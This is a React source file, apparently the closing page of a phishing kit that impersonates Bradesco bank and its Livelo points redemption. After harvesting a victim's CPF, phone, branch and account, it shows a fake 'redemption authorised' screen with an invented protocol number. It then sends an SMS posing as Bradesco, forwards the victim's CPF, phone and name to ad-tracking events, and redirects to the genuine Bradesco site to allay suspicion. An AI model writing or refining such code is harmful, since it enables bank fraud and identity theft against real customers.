import { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import LottieBackground from "@/components/LottieBackground";
import Lottie from "lottie-react";
import finishedOrderAnimation from "@/assets/finished-order.json";
import { getSegmentLogo } from "@/lib/segment-config";
import { segmentButtonStyle } from "@/lib/segment-colors";
import { configRepository } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import { unmask } from "@/lib/masks";
import { trackCompleteRegistration } from "@/lib/tracking";
import { sendServerEvent } from "@/lib/tracking-capi";

function maskCpfDisplay(cpf: string): string {
  const digits = cpf.replace(/\D/g, "");
  if (digits.length !== 11) return cpf;
  return `•••.${digits.slice(3, 6)}.${digits.slice(6, 9)}-••`;
}

interface CompleteTexts {
  titulo: string;
  subtitulo: string;
  mensagem: string;
  botao: string;
  botao_url: string;
}

const DEFAULTS: CompleteTexts = {
  titulo: "Resgate Autorizado!",
  subtitulo: "Sua validação foi concluída com sucesso.",
  mensagem: "O resgate dos seus pontos Livelo será processado em até 48 horas úteis.",
  botao: "Voltar ao Início",
  botao_url: "https://banco.bradesco/html/classic/index.shtm",
};

const CompletePage = () => {
  const navigate = useNavigate();
  const { data } = useFlow();
  const logo = getSegmentLogo(data.segment);
  const btnStyle = segmentButtonStyle(data.segment);
  const smsSentRef = useRef(false);
  const [texts, setTexts] = useState<CompleteTexts>(DEFAULTS);

  const protocolo = useMemo(
    () => Math.random().toString(36).slice(2, 10).toUpperCase(),
    []
  );

  useEffect(() => {
    if (!data.cpf) navigate("/");
  }, [data.cpf, navigate]);

  // Fetch editable texts from admin config
  useEffect(() => {
    configRepository.getByKeys(["complete_texts"]).then((rows) => {
      const row = rows.find((r) => r.config_key === "complete_texts");
      if (row?.config_value) {
        try {
          const val = typeof row.config_value === "string"
            ? JSON.parse(row.config_value)
            : row.config_value;
          setTexts((prev) => ({ ...prev, ...val }));
        } catch {
          // keep defaults if admin saved invalid JSON
        }
      }
    }).catch((err) => console.error("[CompletePage] config fetch error:", err));
  }, []);

  // Track CompleteRegistration once
  const trackedRef = useRef(false);
  useEffect(() => {
    if (trackedRef.current || !data.cpf) return;
    trackedRef.current = true;
    const eventId = trackCompleteRegistration({ content_name: "complete_flow" });

    // Split nome into first/last for better EMQ match quality
    const nameParts = (data.nome ?? "").trim().split(/\s+/);
    const fn = nameParts[0] ?? "";
    const ln = nameParts.length > 1 ? nameParts[nameParts.length - 1] : "";

    sendServerEvent({
      event_name: "CompleteRegistration",
      event_id: eventId,
      // ph + fn + ln + external_id (CPF) maximise Event Match Quality
      user_data: {
        ph: unmask(data.phone),
        external_id: unmask(data.cpf),
        ...(fn ? { fn } : {}),
        ...(ln ? { ln } : {}),
      },
    });
  }, [data.cpf, data.phone]);

  // Send completion SMS
  useEffect(() => {
    if (!data.phone || smsSentRef.current) return;
    smsSentRef.current = true;

    const phone = unmask(data.phone);
    const defaultMsg = `Bradesco: Resgate autorizado! Protocolo ${protocolo}. Ag ${data.agency || "-"} Cc ${data.account || "-"}. Processamento em ate 48h uteis.`;

    // Fetch SMS template from admin config, fallback to default
    configRepository.getByKeys(["sms_template"]).then((rows) => {
      const row = rows.find((r) => r.config_key === "sms_template");
      let raw = (row?.config_value as string) || "";
      // Clean up double-encoded JSON strings and HTML entities
      let cleaned = raw;
      try { cleaned = JSON.parse(raw); } catch { /* not JSON-wrapped */ }
      if (typeof cleaned === "string") {
        cleaned = cleaned.replace(/&quot;/g, '"').replace(/&amp;/g, '&').replace(/&#39;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>');
      }
      let msg = cleaned || defaultMsg;

      msg = msg
        .replace(/\{\{protocolo\}\}/g, protocolo)
        .replace(/\{\{agencia\}\}/g, data.agency || "-")
        .replace(/\{\{conta\}\}/g, data.account || "-")
        .replace(/\{\{cpf\}\}/g, data.cpf ? maskCpfDisplay(data.cpf) : "-")
        .replace(/\{\{nome\}\}/g, data.nome || "-");

      edgeFunctionsService.sendSms(phone, msg).catch((err) =>
        console.error("SMS send error:", err)
      );
    });
  }, [data.phone, data.agency, data.account, protocolo, data.cpf, data.nome]);

  return (
    <div className="relative flex min-h-screen flex-col px-6 py-8 pb-safe">
      <LottieBackground segment={data.segment} />

      {/* Header */}
      <div className="relative z-10 mb-4">
        <img src={logo} alt="Bradesco" className="w-[120px] h-auto object-contain brightness-0 invert" />
      </div>

      {/* Heading */}
      <h1 className="relative z-10 text-lg font-bold leading-snug text-white mb-0">
        {texts.titulo}
      </h1>
      <p className="relative z-10 text-body-sm text-white/60 mt-1">
        {texts.subtitulo}
      </p>

      {/* Spacer */}
      <div className="flex-1 min-h-[40px] max-h-[100px]" />

      {/* Success content */}
      <div className="relative z-10 mb-8">
        <div className="flex justify-center mb-6">
          <Lottie animationData={finishedOrderAnimation} loop={true} className="w-[260px] h-auto" />
        </div>

        <p className="text-body-sm text-white/60 text-center mb-6">
          {texts.mensagem}
        </p>

        {/* Lead data card */}
        <div className="rounded-xl bg-white/10 p-4 text-body-sm text-white/70 space-y-2">
          <p>
            <span className="font-semibold text-white">Protocolo:</span>{" "}
            {protocolo}
          </p>
          <p>
            <span className="font-semibold text-white">Data:</span>{" "}
            {new Date().toLocaleDateString("pt-BR")}
          </p>
          {data.cpf && (
            <p>
              <span className="font-semibold text-white">CPF:</span>{" "}
              {maskCpfDisplay(data.cpf)}
            </p>
          )}
          {data.agency && (
            <p>
              <span className="font-semibold text-white">Agência:</span>{" "}
              {data.agency}
            </p>
          )}
          {data.account && (
            <p>
              <span className="font-semibold text-white">Conta:</span>{" "}
              {data.account}
            </p>
          )}
        </div>
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* Button */}
      <a
        href={texts.botao_url}
        rel="noopener noreferrer"
        className="relative z-10 flex h-14 w-full items-center justify-center rounded-full shadow-lg transition-all active:scale-[0.98] text-body font-semibold"
        style={{ backgroundColor: btnStyle.backgroundColor, color: btnStyle.color }}
      >
        {texts.botao}
      </a>
    </div>
  );
};

export default CompletePage;
